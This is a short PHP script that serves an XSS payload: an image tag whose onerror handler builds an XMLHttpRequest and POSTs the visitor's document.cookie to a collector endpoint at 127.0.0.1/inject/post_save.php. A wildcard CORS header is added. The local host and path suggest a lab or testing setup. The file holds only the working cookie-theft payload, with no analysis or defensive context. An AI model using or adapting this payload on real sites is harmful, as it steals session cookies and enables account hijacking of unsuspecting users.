<?php
header("Access-Control-Allow-Origin: *");
echo '<img src="x" onerror="(function() {
			var result;
			try {
				result = new window.XMLHttpRequest();
			} catch (e) {
				result = null;
			}
			result.open(\'POST\', \'http://127.0.0.1/inject/post_save.php?data=\' + escape(document.cookie));
			result.send();
		})()"
>';